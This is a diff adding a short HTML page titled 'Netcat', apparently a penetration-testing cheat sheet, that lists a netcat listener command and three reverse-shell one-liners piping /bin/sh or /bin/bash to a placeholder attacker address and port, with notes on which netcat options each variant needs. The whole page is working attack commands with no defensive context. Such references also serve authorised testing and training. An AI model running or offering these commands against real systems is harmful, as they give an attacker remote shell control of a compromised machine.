@@ -1,0 +1,10 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Netcat</title>
+</head><body>LISTEN WITH: nc -lvvnp &lt;LPORT&gt;<br/>
+<br/>
+/bin/sh | nc &lt;LIP&gt; &lt;LPORT&gt;									no -e, but needs pipe<br/>
+nc -e /bin/sh &lt;LIP&gt; &lt;LPORT&gt;								relies on being able to use the -e argument<br/>
+/usr/local/bin/nc &lt;LIP&gt; &lt;LPORT&gt; -e '/bin/bash'					using the full path of netcat (default)<br/>
+</body></html>
